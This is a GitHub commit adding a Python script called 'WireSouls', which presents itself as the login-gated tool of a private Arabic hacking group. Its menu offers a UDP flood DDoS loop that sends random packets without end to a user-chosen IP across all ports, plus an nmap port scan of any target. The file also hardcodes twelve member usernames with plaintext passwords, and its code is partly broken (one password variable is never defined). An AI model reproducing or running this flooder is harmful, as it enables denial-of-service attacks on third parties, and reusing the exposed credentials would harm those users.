411214b5418a79197ef35ed7c677af91f1c383aa
bananajoe000 <57542523+bananajoe000@users.noreply.github.com>
2019-11-08 20:37:05 +0100

    Add files via upload

---
+++ wiresouls.py
@@ -0,0 +1,247 @@
+import nmap
+from termcolor import colored
+import sys
+import os
+import time
+import socket
+import random
+from colorama import Fore ,Style
+import pyfiglet
+import time
+
+
+scanner = nmap.PortScanner()
+
+
+x = 0 
+
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+
+
+
+user1 = ("bananajoe")
+pass1 = ("root")
+
+user2 = ("max-cyber")
+pass2 = ("cyber$$$$$$")
+
+user3 = ("wb")
+pass3 = ("2000")
+
+user4 = ("m4do")
+pass4 = ("hm887438")
+
+user5 = ("virus")
+pass4 = ("7043509483")
+
+user6 = ("ali74")
+pass6 = ("bon211")
+
+user7 = ("yemenas")
+pass7 = ("aa123456AA")
+
+
+user8 = ("monsif")
+pass8 = ("123123")
+
+user9 = ("mokito")
+pass9 = ("+kimo1+")
+
+user10 = ("marwanb10")
+pass10 = ("ana0258")
+
+user11 = ("LMXR8")
+pass11 = ("31428055")
+
+user12 =("drcybersecuirty")
+pass12 =("12341234")
+
+#this for clear
+print(chr(27)+'[2j')
+print('\033c')
+print('\x1bc')
+
+
+print ("#########################")
+print ("#  Hey This is Private  #")
+print ("#  Group You Have To    #")
+print ("#  login to enter This  #")
+print ("#         Group         #")
+print ("#########################")
+print (Fore.RED +"                        Warning")
+
+print ("")
+print ("")
+username = input ("Enter Your Username : ")
+password = input ("Enter Your Password : ")
+
+if username == user1 and password == pass1 :
+ print (Fore.GREEN + "[*] Cheking The username and password")
+ time.sleep(2)
+ print("[*] Starting WireSouls")
+ time.sleep(4)
+ x = x+ 10
+if username == user2 and password == pass2 :
+ print (Fore.GREEN + "[*] Cheking The username and password")
+ time.sleep(2)
+ print("[*] Starting WireSouls")
+ time.sleep(4)
+ x = x+ 10
+if username == user3 and password == pass3 :
+ print (Fore.GREEN + "[*] Cheking The username and password")
+ time.sleep(2)
+ print("[*] Starting WireSouls")
+ time.sleep(4)
+ x = x+ 10
+if username == user4 and password == pass4 :
+ print (Fore.GREEN + "[*] Cheking The username and password")
+ time.sleep(2)
+ print("[*] Starting WireSouls")
+ time.sleep(4)
+ x = x+ 10
+if username == user5 and password == pass5 :
+ print (Fore.GREEN + "[*] Cheking The username and password")
+ time.sleep(2)
+ print("[*] Starting WireSouls")
+ time.sleep(4)
+ x = x+ 10
+if username == user6 and password == pass6 :
+ print (Fore.GREEN + "[*] Cheking The username and password")
+ time.sleep(2)
+ print("[*] Starting WireSouls")
+ time.sleep(4)
+ x = x+ 10
+if username == user7 and password == pass7 :
+ print (Fore.GREEN + "[*] Cheking The username and password")
+ time.sleep(2)
+ print("[*] Starting WireSouls")
+ time.sleep(4)
+ x = x+ 10
+if username == user8 and password == pass8 :
+ print (Fore.GREEN + "[*] Cheking The username and password")
+ time.sleep(2)
+ print("[*] Starting WireSouls")
+ time.sleep(4)
+ x = x+ 10
+if username == user9 and password == pass9 :
+ print (Fore.GREEN + "[*] Cheking The username and password")
+ time.sleep(2)
+ print("[*] Starting WireSouls")
+ time.sleep(4)
+ x = x+ 10
+if username == user10 and password == pass10 :
+ print (Fore.GREEN + "[*] Cheking The username and password")
+ time.sleep(2)
+ print("[*] Starting WireSouls")
+ time.sleep(4)
+ x = x+ 10
+if username == user11 and password == pass11 :
+ print (Fore.GREEN + "[*] Cheking The username and password")
+ time.sleep(2)
+ print("[*] Starting WireSouls")
+ time.sleep(4)
+ x = x+ 10
+if username == user12 and password == pass12 :
+ print (Fore.GREEN + "[*] Cheking The username and password")
+ time.sleep(2)
+ print("[*] Starting WireSouls")
+ time.sleep(4)
+ x = x+ 10                                                         
+
+else :
+
+
+ print (Fore.RED + "Error")
+
+
+if x == 10 :
+ #this for clear
+ print(chr(27)+'[2j')
+ print('\033c')
+ print('\x1bc')
+
+ a = pyfiglet.figlet_format("      WireSouls")
+ print(Fore.RED + a)
+ print ("")
+ print (Fore.BLUE +"                                          By BananaJoe")
+
+
+ print ("")
+ print ("")
+ print (" 1] DDos                              2] Ranks ")
+ print (" 3] Who Are wireSouls                 4] Exit ")
+ print (" 5] Scan      ")
+ print ("")
+ number = input (Fore.GREEN + "Enter Number : ")
+
+ if number == ("1") :
+                           
+  ip = input("IP Target : ")
+  port = int(input("Port       : "))
+
+  os.system("clear")
+  os.system("figlet Attack Starting")
+  print ("[                    ] 0% ")
+  time.sleep(2)
+  print ("[=====               ] 25%")
+  time.sleep(2)
+  print ("[==========          ] 50%")
+  time.sleep(2)
+  print ("[===============     ] 75%")
+  time.sleep(2)
+  print ("[====================] 100%")
+  time.sleep(3)
+  sent = 0
+  while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print ("Sent %s packet to %s throught port:%s",sent,ip,port)
+     if port == 65534:
+       port = 1
+                                                                                                        
+ elif number == ("2") :
+  print ("")
+  print (Fore.GREEN + "     Members                           Rank ")
+  print (Fore.BLUE + """    bananajoe                         SouL
+    M4do                              Member  
+    virus                             Member
+    marwanb10                         Member
+    max-cyber                         Trapper
+    mokito                            Member 
+    ali74                             Member
+    yemenas                           Member
+    monsif                            Member
+   "LMXR8                             Member
+    wb                                Noob
+
+   """)
+
+ elif number == ("3") :
+  print ("wireSouls Are an arabic Private Hacking Group :( ")                          
+
+ elif number == ("4") :
+   x = x + 10
+
+ elif number == ("5") :
+  ip_addr = input("Enter The Target IP : ")
+  print(Fore.GREEN + "[*] The Target IP is",ip_addr)
+  time.sleep(2)
+  print(colored("[*] Please Wait",'green'))
+  time.sleep(2)
+  print(colored("[*] Scanning",'red'))
+  time.sleep(2)
+  scanner.scan(ip_addr, '1-1024' , '-Pn')
+  print(Fore.BLUE + "[*] Ip Status : ", scanner[ip_addr].state())
+  print("[*] Open Ports :  ",list(scanner[ip_addr]['tcp'].keys()))
+  print ("")
+  print ("")
+
+if x == 20 :
+ print (Fore.RED + "GoodBye :( ")
+
